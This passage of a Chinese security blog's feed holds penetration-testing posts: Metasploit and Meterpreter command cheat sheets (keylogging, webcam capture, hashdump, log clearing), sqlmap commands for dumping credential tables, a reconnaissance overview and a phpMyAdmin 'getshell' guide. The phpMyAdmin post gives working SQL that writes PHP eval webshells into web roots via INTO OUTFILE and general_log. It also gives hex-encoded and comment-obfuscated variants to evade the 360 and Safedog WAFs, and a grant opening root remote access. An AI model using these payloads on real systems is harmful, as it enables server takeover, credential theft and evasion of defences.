Commands</h4><p>window_enum：枚举当前打开的所有窗口<br>service_control：控制单个服务（启动/暂停/恢复/停止/重启）<br>service_enum：枚举已注册的所有Windows服务<br>service_query：查询特定Windows服务的更多详细信息<br>clipboard_get_data：读取目标的当前剪贴板（文本，文件，图像）<br>clipboard_monitor_dump：转储所有捕获的剪贴板内容<br>clipboard_monitor_pause：暂停活动剪贴板监视器<br>clipboard_monitor_purge：删除所有捕获的剪贴板内容而不转储它<br>clipboard_monitor_resume：恢复暂停的剪贴板监视器<br>clipboard_monitor_start：启动剪贴板监视器<br>clipboard_monitor_stop：停止剪贴板监视器<br>clipboard_set_text：将文本写入目标的剪贴板<br>adsi_computer_enum：枚举指定域中的所有计算机<br>adsi_dc_enum：枚举指定域上的所有域控制器<br>adsi_domain_query：枚举指定域中与筛选器匹配的所有对象<br>adsi_group_enum：枚举指定域上的所有组<br>adsi_nested_group_user_enum：递归枚举实际上是指定组成员的用户<br>adsi_user_enum：枚举指定域中的所有用户<br>wmi_query：执行通用WMI查询并返回结果  </p>]]></content>
      
      
      <categories>
          
          <category> msf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit命令速查表</title>
      <link href="/2019/10/07/Metasploit%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5%E8%A1%A8/"/>
      <url>/2019/10/07/Metasploit%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h4 id="一、Metasploit-Database-ManageCommand（数据库管理命令）"><a href="#一、Metasploit-Database-ManageCommand（数据库管理命令）" class="headerlink" title="一、Metasploit Database ManageCommand（数据库管理命令）"></a>一、Metasploit Database ManageCommand（数据库管理命令）</h4><p>msfdb init：启动并初始化数据库<br>msfdb reinit：删除并重新初始化数据库<br>msfdb delete：停止使用数据库并且删除<br>msfdb run：启动数据库并运行msfconsole<br>msfdb start：启动数据库<br>msfdb stop：停止数据库<br>msfdb status：检查服务状态  </p><h4 id="二、Metasploit-Core-Commands（核心命令）"><a href="#二、Metasploit-Core-Commands（核心命令）" class="headerlink" title="二、Metasploit Core Commands（核心命令）"></a>二、Metasploit Core Commands（核心命令）</h4><p>?：帮助菜单<br>banner：显示Metasploit旗标信息<br>cd：更改当前工作目录<br>color：切换颜色<br>connect：与主机通信<br>exit：退出控制台<br>get：获取特定变量的值<br>getg：获取全局变量的值<br>grep：搜索另一个命令的输出<br>help：帮助菜单<br>history：显示命令历史记录<br>load：加载框架插件<br>quit：退出控制台<br>repeat：重复一个命令列表<br>route：通过会话路由流量<br>save：保存活动数据存储<br>sessions：显示会话列表和信息<br>set：设置一个变量的值<br>setg：设置一个全局变量的值<br>sleep：在指定的秒数内不执行任何操作<br>spool：将控制台输出写入文件以及屏幕<br>threads：查看和操作后台线程<br>unload：卸载框架插件<br>unset：取消设置的一个或多个变量<br>unsetg：取消设置一个或多个全局变量<br>version：显示框架和控制台库版本号  </p><h4 id="三、Metasploit-Module-Commands（模块命令）"><a href="#三、Metasploit-Module-Commands（模块命令）" class="headerlink" title="三、Metasploit Module Commands（模块命令）"></a>三、Metasploit Module Commands（模块命令）</h4><p>advanced：显示一个或多个模块的高级选项<br>back：从当前环境返回<br>info：显示一个或多个模块的详细信息<br>loadpath：从路径中搜索并加载模块<br>options：显示全局选项或一个或多个模块<br>popm：使其主动从堆栈弹出新的模块<br>previous：将先前加载的模块设置为当前模块<br>pushm：将活动模块或模块列表推送到模块堆栈<br>reload_all：重新加载所有模块<br>search：搜索模块名称和描述<br>show：显示给定类型的的模块或所有模块<br>use：按名称选择模块  </p><h4 id="四、Metasploit-Job、Script-Commands（作业、脚本命令）"><a href="#四、Metasploit-Job、Script-Commands（作业、脚本命令）" class="headerlink" title="四、Metasploit Job、Script Commands（作业、脚本命令）"></a>四、Metasploit Job、Script Commands（作业、脚本命令）</h4><p>makerc：保存从开始时输入的命令到一个文件<br>resource：运行存储在一个文件中的命令<br>handler：将有效载荷处理程序作为作业启动<br>jobs：显示和管理作业<br>kill：杀死一个作业<br>rename_job：重命名作业  </p><h4 id="五、Metasploit-Database-Backend-Commands（后端数据库命令）"><a href="#五、Metasploit-Database-Backend-Commands（后端数据库命令）" class="headerlink" title="五、Metasploit Database Backend Commands（后端数据库命令）"></a>五、Metasploit Database Backend Commands（后端数据库命令）</h4><p>analyze：分析有关特定地址或地址范围的数据库信息<br>db_connect：连接到现有数据服务<br>db_disconnect：断开与当前数据服务的连接<br>db_export：导出包含数据库内容的文件<br>db_import：导入扫描结果文件（将自动检测文件类型）<br>db_nmap：执行nmap并自动记录输出<br>db_rebuild_cache：重建数据库存储的模块高速缓存<br>db_remove：删除已保存的数据服务条目<br>db_save：将当前数据服务连接保存为启动时重新连接的默认值<br>db_status：显示当前数据库服务状态<br>creds：列出数据库中的所有凭证<br>hosts：列出数据库中的所有主机<br>loot：列出所有数据库中的战利品<br>notes：列出数据库中的所有记录<br>services：列出数据库中的所有服务<br>vulns：列出数据库中的所有漏洞<br>workspace：在数据库工作区之间切换  </p><h4 id="六、Metasploit-Developer、Exploit-Commands（开发、利用命令）"><a href="#六、Metasploit-Developer、Exploit-Commands（开发、利用命令）" class="headerlink" title="六、Metasploit Developer、Exploit Commands（开发、利用命令）"></a>六、Metasploit Developer、Exploit Commands（开发、利用命令）</h4><p>edit：使用首选编辑器编辑当前模块或文件<br>irb：打开交互式Ruby shell<br>log：如果可能，显示frame.log分页到最后<br>pry：在当前模块或框架上打开Pry调试器<br>reload_lib：从指定路径重新加载Ruby库文件<br>check：检查目标是否容易受到攻击<br>exploit：启动漏洞利用尝试<br>rcheck：重新加载模块并检查目标是否易受攻击<br>recheck：重新检查rcheck的别名<br>reload：重新加载指定模块<br>rerun：重新运行rexploit的别名<br>rexploit：重新加载模块并启动漏洞利用尝试<br>run：运行别名以进行利用  </p>]]></content>
      
      
      <categories>
          
          <category> msf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Meterpreter命令速查表</title>
      <link href="/2019/10/06/Meterpreter%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5%E8%A1%A8/"/>
      <url>/2019/10/06/Meterpreter%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h4 id="一、Meterpreter-Core-Commands（核心命令）"><a href="#一、Meterpreter-Core-Commands（核心命令）" class="headerlink" title="一、Meterpreter Core Commands（核心命令）"></a>一、Meterpreter Core Commands（核心命令）</h4><p>?：帮助菜单<br>background：当前会话后台模式<br>bg：当前会话后台模式<br>bgkill：结束一个后台Meterpreter脚本<br>bglist：列出后台运行Meterpreter脚本<br>bgrun：作为一个后台运行Meterpreter脚本<br>channel：显示有关活动通道的信息<br>close：关闭通道<br>disable_unicode_encoding：禁用Unicode字符串编码<br>enable_unicode_encoding：启用Unicode字符串编码<br>exit：终止Meterpreter会话<br>get_timeouts：获取当前会话超时<br>guid：获取会话GUID<br>help：帮助菜单<br>info：显示指定Post模块的信息<br>irb：在当前会话中打开交互式Ruby shell<br>load：加载一个或多个Meterpreter扩展<br>machine_id：获取会话计算机的Machine ID<br>migrate：移动到一个指定的PID活动进程<br>pivot：管理数据透视侦听器<br>pry：在当前会话中打开Pry调试器<br>quit：终止Meterpreter会话<br>read：从通道读取数据<br>resource：运行存储在文件中的命令<br>run：执行Meterpreter脚本或Post模块<br>sessions：快速切换到另一个会话<br>set_timeouts：设置当前会话超时值<br>sleep：设置目标会话睡眠时间<br>transport：更改当前的传输机制<br>use：不推荐使用的别名“load”<br>uuid：获取当前会话的UUID<br>write：将数据写入通道  </p><h4 id="二、Stdapi-File-System-Commands（文件系统命令）"><a href="#二、Stdapi-File-System-Commands（文件系统命令）" class="headerlink" title="二、Stdapi: File System Commands（文件系统命令）"></a>二、Stdapi: File System Commands（文件系统命令）</h4><p>cat：查看文件内容cd：更改目录<br>checksum：检索文件的MD5、SHA1<br>cp：复制文件或目录到目的地<br>dir：列出目标文件列表（ls的别名）<br>download：下载文件或目录<br>edit：编辑文件<br>getlwd：显示本地工作目录<br>getwd：显示目标工作目录<br>lcd：更改本地工作目录<br>lls：列出本地文件列表<br>lpwd：显示本地工作目录<br>ls：列出目标文件列表<br>mkdir：创建目录<br>mv：移动文件或目录<br>pwd：显示目标工作目录<br>rm：删除指定文件<br>rmdir：删除指定目录<br>search：搜索文件<br>show_mount：列出所有挂载点/逻辑驱动器<br>upload：上传文件或目录  </p><h4 id="三、Stdapi-Networking、System-Commands（网络、系统命令）"><a href="#三、Stdapi-Networking、System-Commands（网络、系统命令）" class="headerlink" title="三、Stdapi: Networking、System Commands（网络、系统命令）"></a>三、Stdapi: Networking、System Commands（网络、系统命令）</h4><p>arp：显示主机ARP缓存<br>getproxy：显示当前代理配置<br>ifconfig：显示网络接口信息<br>ipconfig：显示网络接口信息<br>netstat：显示网络连接信息<br>portfwd：将本地端口转发到远程服务<br>resolve：解析目标上的一组主机名<br>route：查看和修改路由表<br>clearev：清除事件日志<br>drop_token：放弃任何活动模拟令牌<br>execute：执行命令<br>getenv：获取一个或多个环境变量值<br>getpid：获取当前进程标识符<br>getprivs：尝试启用当前进程可用的所有特权<br>getuid：获取当前会话权限<br>kill：终止进程<br>localtime：显示目标系统的本地日期和时间<br>pgrep：按名称过滤进程<br>pkill：按名称终止进程<br>ps：列出正在运行的进程<br>reboot：重新启动远程计算机<br>reg：修改远程注册表并进行交互<br>rev2self：在远程计算机上调用RevertToSelf（）<br>shell：进入系统命令shell<br>shutdown：关闭远程计算机<br>steal_token：尝试从目标进程中窃取模拟令牌<br>suspend：暂停或恢复进程列表<br>sysinfo：获取远程系统的有关信息，例如OS  </p><h4 id="四、Stdapi-User-interface、Webcam-Commands（用户界面、音频、摄像头命令）"><a href="#四、Stdapi-User-interface、Webcam-Commands（用户界面、音频、摄像头命令）" class="headerlink" title="四、Stdapi: User interface、Webcam Commands（用户界面、音频、摄像头命令）"></a>四、Stdapi: User interface、Webcam Commands（用户界面、音频、摄像头命令）</h4><p>enumdesktops：枚举所有可访问桌面<br>getdesktop：获取当前的Meterpreter桌面<br>idletime：返回远程用户空闲的秒数<br>keyscan_dump：存储目标主机上捕获的键盘记录<br>keyscan_start：启动键盘记录<br>keyscan_stop：停止键盘记录<br>screenshot：获取目标桌面屏幕截图<br>setdesktop：更改当前Meterpreters桌面<br>uictl：控制一些用户界面组件（键盘和鼠标）<br>play：请指定音频文件的路径<br>record_mic：从默认麦克风录制音频为X秒<br>webcam_chat：开始视频聊天<br>webcam_list：列出网络摄像头<br>webcam_snap：从指定的网络摄像头拍摄快照<br>webcam_stream：播放指定网络摄像头的视频流  </p><h4 id="五、Priv-Elevate、Timestomp、Password-Commands（提权、属性、密码命令）"><a href="#五、Priv-Elevate、Timestomp、Password-Commands（提权、属性、密码命令）" class="headerlink" title="五、Priv: Elevate、Timestomp、Password Commands（提权、属性、密码命令）"></a>五、Priv: Elevate、Timestomp、Password Commands（提权、属性、密码命令）</h4><p>getsystem：尝试将您的权限提升为本地系统的权限<br>timestomp：操作文件时间属性（修改、访问、创建）<br>hashdump：获取目标NTLM-HASH值  </p>]]></content>
      
      
      <categories>
          
          <category> msf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap</title>
      <link href="/2019/10/06/sqlmap/"/>
      <url>/2019/10/06/sqlmap/</url>
      
        <content type="html"><![CDATA[<h2 id="sqlmap基本用法"><a href="#sqlmap基本用法" class="headerlink" title="sqlmap基本用法"></a>sqlmap基本用法</h2><p>sqlmap的使用是基于我们已经通过手工注入的方法简单判断出注入类型，然后我们通过不同的参数来制定不同的payload。<br>下面的是最简单的联合查询注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">列举数据库</span><br><span class="line">sqlmap.py -u &quot;注入地址&quot; --dbs</span><br><span class="line">列举库中的表名</span><br><span class="line">sqlmap.py -u &quot;注入地址&quot; -D 库名 --tables</span><br><span class="line">列举表的列名</span><br><span class="line">sqlmap.py -u &quot;注入地址&quot; -D 库名 -T 表名 --columns</span><br><span class="line">列举字段内容</span><br><span class="line">sqlmap.py -u &quot;注入地址&quot; -D 库名 -T 表名 -C &quot;id,username,password&quot; --dump(字段可以是自己想要的内容)</span><br></pre></td></tr></table></figure><h4 id="sqlmap-post注入"><a href="#sqlmap-post注入" class="headerlink" title="sqlmap post注入"></a>sqlmap post注入</h4><p>我们在使用post注入时，有时会出现请求遗漏而导致注入失败的情况。这里可以使用burpsuit结合sqlmap来进行post注入<br>步骤如下：</p><p>1.浏览器打开目标网站<br>2.配置burp代理<br>3.点击提交表单的按钮<br>4.这时候burp会拦截我们的post请求<br>5.把post请求复制为txt文件,假设命名为666.txt，位置为：C:\Users\user\Desktop\666.txt<br>6.运行sqlmap输入命令：sqlmap.py -r “C:\Users\user\Desktop\666.txt”<br>之后会爆出数据库名，然后后面的操作就和基础注入类似了<br>这时爆库，爆表等操作和上面的基础注入方类似，只是多了-p指定参数</p><h4 id="sqlmap-cookie注入"><a href="#sqlmap-cookie注入" class="headerlink" title="sqlmap cookie注入"></a>sqlmap cookie注入</h4><p>默认情况下，sqlmap只支持get/post类型的注入，但当使用–level参数且值大于等于2时，也会检查cookie里的参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u 注入点URL --cookie&quot;id=xx&quot; --level 3</span><br><span class="line">sqlmap.py -u url --cookie &quot;id=xx&quot;--level 3 --tables(猜表名)</span><br><span class="line">sqlmap.py -u url --cookie &quot;id=xx&quot;--level 3 -T 表名 --columns</span><br><span class="line">sqlmap.py -u url --cookie &quot;id=xx&quot;--level 3 -T 表名 -C username，password --dump</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/2019/10/06/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2019/10/06/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h3 id="1-被动收集："><a href="#1-被动收集：" class="headerlink" title="1 被动收集："></a>1 被动收集：</h3><p>利用第三方的服务对目标进行信息收集，比如：Google搜索。<br>获取域名的Whois信息，可以获取到域名注册者的邮箱等电话信息(用来社会工程学攻击)<br>ip地址段<br>公司地址<br>公司组织架构（对于后渗透这块有帮助）<br>人员姓名/职务信息<br>公开的商业信息<br>目标系统使用的技术架构  </p><h4 id="常用工具："><a href="#常用工具：" class="headerlink" title="常用工具："></a>常用工具：</h4><ol><li>theHarvester<br>是一款社会工程学工具，主要用来收集用户的Email、子域名、主机、开放端口和banner信息。</li><li>meltago<br>综合性信息收集软件，有图形化操作界面，可以使用不通类型的信息收集，也可以自定义。</li><li>nslookup<br>还有查询dns解析过程的命令：nslookup、dig、host。</li><li>搜索引擎<br>Shodan、Zoomeye、Google Hacking等之类的搜索平台，进一步探测网站的信息，后台等敏感信息。 </li></ol><h3 id="2-主动收集："><a href="#2-主动收集：" class="headerlink" title="2 主动收集："></a>2 主动收集：</h3><p>端口扫描：Nmap、Zenmap、Masscan。<br>主机扫描：Nessus、Openvas、Nexpose。<br>子域名：常用的有dnsmap、subDomainsbrute、layer子域名挖掘机。<br>网站扫描：Wvs、Burpsuite、Dirb、Gobuster等。<br>手工查找漏洞：SQL注入、上传漏洞、文件包含、命令执行、等等漏洞。<br>是不是在第一步骤发现了NETBIOS、SMB、RPC、FTP端口？<br>暴力破解：用收集到的信息组成字典用来爆棚SSH、FTP、网页后台等。<br>数据包分析：用Tcpdump、Wireshark捕获目标主机的流量进行分析。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>phpmyadmin后台getshell</title>
      <link href="/2019/10/06/phpmyadmin%E5%90%8E%E5%8F%B0getshell/"/>
      <url>/2019/10/06/phpmyadmin%E5%90%8E%E5%8F%B0getshell/</url>
      
        <content type="html"><![CDATA[<p>导出WebShell主要条件：<br>Root数据库用户（root权限）<br>网站绝对路径（确定有写入权限）<br>magic_quotes_gpc：Off（关闭）</p><p>导出WebShell其它条件：<br>magic_quotes_gpc：开启时，会对’单引号进行转义，使其变成“\”反斜杠。</p><p>secure_file_priv：此配置项用来完成对数据导入导出的限制，如允许导入导出到指定目录。</p><p>file_priv：file_priv权限允许你用load_file、into outfile读和写服务器上的文件，任何被授予这个权限的用户都能读和写服务器的任何文件。</p><h3 id="1-弱口令进入phpmyadmin后台后"><a href="#1-弱口令进入phpmyadmin后台后" class="headerlink" title="1.弱口令进入phpmyadmin后台后"></a>1.弱口令进入phpmyadmin后台后</h3><h3 id="2-查看phpinfo，获得网站在该服务器上的绝对路径"><a href="#2-查看phpinfo，获得网站在该服务器上的绝对路径" class="headerlink" title="2.查看phpinfo，获得网站在该服务器上的绝对路径"></a>2.查看phpinfo，获得网站在该服务器上的绝对路径</h3><h4 id="方法一：在数据库中建表，存入一句话木马，然后导出文件"><a href="#方法一：在数据库中建表，存入一句话木马，然后导出文件" class="headerlink" title="方法一：在数据库中建表，存入一句话木马，然后导出文件"></a>方法一：在数据库中建表，存入一句话木马，然后导出文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Create TABLE a (cmd text NOT NULL);</span><br><span class="line">Insert INTO a (cmd) VALUES(&apos;&lt;?php eval($_POST[baji]);?&gt;&apos;);</span><br><span class="line">select cmd from a into outfile &apos;D:/phpstudy/www/d.php&apos;;</span><br><span class="line">Drop TABLE IF EXISTS a;</span><br><span class="line">一句话连接密码：baji</span><br></pre></td></tr></table></figure><h4 id="方法二：通过日志记录功能插入一句话木马"><a href="#方法二：通过日志记录功能插入一句话木马" class="headerlink" title="方法二：通过日志记录功能插入一句话木马"></a>方法二：通过日志记录功能插入一句话木马</h4><p>检查日志记录相关的全局变量的值：SHOW VARIABLES LIKE “general%”;</p><p>设置为on，开启general_log 的作用：开启它可以记录用户输入的每条命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SET global general_log_file=&apos;D:/phpstudy/WWW/xiaoma.php&apos;;</span><br><span class="line">select&apos;&lt;?php eval($_POST[biaji]);?&gt;&apos;;</span><br></pre></td></tr></table></figure><p>设置日志文件的路径，然后执行SQL语句，这个语句将被记录在日志文件中。然后一句话连接，就ok了。</p><h3 id="骚姿势"><a href="#骚姿势" class="headerlink" title="骚姿势"></a>骚姿势</h3><h4 id="1-phpMyAdmin导出至中文路径："><a href="#1-phpMyAdmin导出至中文路径：" class="headerlink" title="1 phpMyAdmin导出至中文路径："></a>1 phpMyAdmin导出至中文路径：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set character_set_client=&apos;gbk&apos;;set character_set_connection=&apos;gbk&apos;;set character_set_database=&apos;gbk&apos;;set character_set_results=&apos;gbk&apos;;set character_set_server=&apos;gbk&apos;;select &apos;&lt;?php eval($_POST[pass]);?&gt;&apos; into outfile &apos;C:\\phpStudy\\WWW\\测试\\90sec.php&apos;;</span><br></pre></td></tr></table></figure><h4 id="2-phpMyAdmin常规导出WebShell（1）："><a href="#2-phpMyAdmin常规导出WebShell（1）：" class="headerlink" title="2 phpMyAdmin常规导出WebShell（1）："></a>2 phpMyAdmin常规导出WebShell（1）：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `mysql`.`shadow9` (`content` TEXT NOT NULL );</span><br><span class="line">INSERT INTO `mysql`.`shadow9` (`content` ) VALUES (&apos;&lt;?php @eval($_POST[pass]);?&gt;&apos;);</span><br><span class="line">SELECT `content` FROM `shadow9` INTO OUTFILE &apos;C:\\phpStudy\\WWW\\90sec.php&apos;;</span><br><span class="line"></span><br><span class="line">Create TABLE shadow9 (content text NOT NULL);</span><br><span class="line">Insert INTO shadow9 (content) VALUES(&apos;&lt;?php @eval($_POST[pass]);?&gt;&apos;);</span><br><span class="line">select content from shadow9 into outfile &apos;C:\\phpStudy\\WWW\\90sec.php&apos;;</span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS `shadow9`;</span><br></pre></td></tr></table></figure><h4 id="3-phpMyAdmin常规导出WebShell（2）："><a href="#3-phpMyAdmin常规导出WebShell（2）：" class="headerlink" title="3 phpMyAdmin常规导出WebShell（2）："></a>3 phpMyAdmin常规导出WebShell（2）：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select &apos;&lt;?php @eval($_POST[pass]);?&gt;&apos; into outfile &apos;c:/phpstudy/www/90sec.php&apos;;  </span><br><span class="line">select &apos;&lt;?php @eval($_POST[pass]);?&gt;&apos; into outfile &apos;c:\\phpstudy\\www\\90sec.php&apos;;</span><br><span class="line">select &apos;&lt;?php @eval($_POST[pass]);?&gt;&apos; into dumpfile &apos;c:\\phpstudy\\www\\bypass.php&apos;;</span><br><span class="line"></span><br><span class="line">select &apos;&lt;?php echo \&apos;&lt;pre&gt;\&apos;;system($_GET[\&apos;cmd\&apos;]); echo \&apos;&lt;/pre&gt;\&apos;; ?&gt;&apos; into outfile &apos;C:\\phpStudy\\WWW\\90sec.php&apos;;          </span><br><span class="line">http://127.0.0.1/90sec.php?cmd=net user</span><br></pre></td></tr></table></figure><h4 id="4-phpMyAdmin-general-log-GetShell："><a href="#4-phpMyAdmin-general-log-GetShell：" class="headerlink" title="4 phpMyAdmin general_log GetShell："></a>4 phpMyAdmin general_log GetShell：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &quot;%genera%&quot;;          //查询general_log配置</span><br><span class="line">set global general_log=&apos;on&apos;;              //开启general log模式</span><br><span class="line">SET global general_log_file=&apos;D:/phpStudy/WWW/cmd.php&apos;;    //设置日志文件保存路径</span><br><span class="line">SELECT &apos;&lt;?php phpinfo();?&gt;&apos;;              //phpinfo()写入日志文件</span><br><span class="line">set global general_log=&apos;off&apos;;              //关闭general_log模式</span><br></pre></td></tr></table></figure><h4 id="5-phpMyAdmin绕过WAF-Getshell（1）："><a href="#5-phpMyAdmin绕过WAF-Getshell（1）：" class="headerlink" title="5 phpMyAdmin绕过WAF Getshell（1）："></a>5 phpMyAdmin绕过WAF Getshell（1）：</h4><p>phpMyAdmin导出WebShell时如果遇到WAF就会被拦截，因为WAF会检测我们提交的POST、GET数据包内容中是否含有危险函数、SHELL特征等，没有通过，有则拦截。这时我们可以尝试开启外链来执行导出WebShell的SQL语句，因为这样走的不是POST、GET方式，所以这样执行SQL语句是不会被WAF拦截的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grant all privileges on *.* to &apos;root&apos;@&apos;%&apos; identified by &apos;root&apos; with grant option;     //开启MySQL外链</span><br><span class="line">flush privileges;                      //刷新MySQL系统权限相关表</span><br></pre></td></tr></table></figure><h4 id="6-phpMyAdmin绕过WAF-Getshell（2）："><a href="#6-phpMyAdmin绕过WAF-Getshell（2）：" class="headerlink" title="6 phpMyAdmin绕过WAF Getshell（2）："></a>6 phpMyAdmin绕过WAF Getshell（2）：</h4><p>检测我们提交SQL语句的POST、GET数据包中是否包含的有WAF特征库中的危险函数、SHELL特征等，如：<?php @eval($_POST[pass]);?>、select、outfile，这样的就会被WAF检测到并进行拦截操作。<br>常规导出被拦截了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &apos;&lt;?php @eval($_POST[pass]);?&gt;&apos; into outfile &apos;c:/phpstudy/www/90sec.php&apos;;</span><br></pre></td></tr></table></figure><h5 id="绕过360网站卫士："><a href="#绕过360网站卫士：" class="headerlink" title="绕过360网站卫士："></a>绕过360网站卫士：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &apos;&lt;?php @eval($_POST[pass]);?&gt;&apos; into /*!50001outfile*/ &apos;c:/phpstudy/www/bypass.php&apos;;</span><br></pre></td></tr></table></figure><h5 id="绕过网站安全狗（-lt-4-0）："><a href="#绕过网站安全狗（-lt-4-0）：" class="headerlink" title="绕过网站安全狗（&lt;4.0）："></a>绕过网站安全狗（&lt;4.0）：</h5><p>注：Hex编码：(提交时也会显示被拦截，其实文件[过狗马]已经导出了!)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile &apos;C:\\phpStudy\\WWW\\bypass.php&apos;;</span><br></pre></td></tr></table></figure><h5 id="绕过网站安全狗（4-0正式版）："><a href="#绕过网站安全狗（4-0正式版）：" class="headerlink" title="绕过网站安全狗（4.0正式版）："></a>绕过网站安全狗（4.0正式版）：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile &apos;C:\\phpStudy\\WWW\\bypass.php&apos;;</span><br></pre></td></tr></table></figure><h4 id="7-绕过server-sql-php、tbl-sql-php、db-sql-php-安全狗导出WebShell："><a href="#7-绕过server-sql-php、tbl-sql-php、db-sql-php-安全狗导出WebShell：" class="headerlink" title="7 绕过server_sql.php、tbl_sql.php、db_sql.php + 安全狗导出WebShell："></a>7 绕过server_sql.php、tbl_sql.php、db_sql.php + 安全狗导出WebShell：</h4><p>server_sql.php、tbl_sql.php、db_sql.php这3个文件中在phpMyAdmin里都具有执行SQL语句的功能，但这3个文件被删除后再点击SQL执行语句时就会出现404错误页面，因为文件已经不存在了，这种情况虽然不常见，但也说不定哦！</p><p>登陆phpMyAdmin，选择MySQL数据库，随便复制1个表的链接，然后在链接后边加上以下过狗导出WebShell的SQL语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql_query=/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile &apos;C:\\phpStudy\\WWW\\bypass.php&apos;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phpmyadmin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>py一句话开启http服务</title>
      <link href="/2019/10/06/py%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%BC%80%E5%90%AFhttp%E6%9C%8D%E5%8A%A1/"/>
      <url>/2019/10/06/py%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%BC%80%E5%90%AFhttp%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="python-一句话就可以搭建http服务"><a href="#python-一句话就可以搭建http服务" class="headerlink" title="python 一句话就可以搭建http服务"></a>python 一句话就可以搭建http服务</h2><h3 id="python-2-x版本"><a href="#python-2-x版本" class="headerlink" title="python 2.x版本"></a>python 2.x版本</h3><p><code>python -m simpleHTTPServer 80</code> </p><h3 id="python-3-x版本"><a href="#python-3-x版本" class="headerlink" title="python 3.x版本"></a>python 3.x版本</h3><p><code>python3 -m http.server 80</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>网络安全法</title>
      <link href="/2019/10/06/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/"/>
      <url>/2019/10/06/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/</url>
      
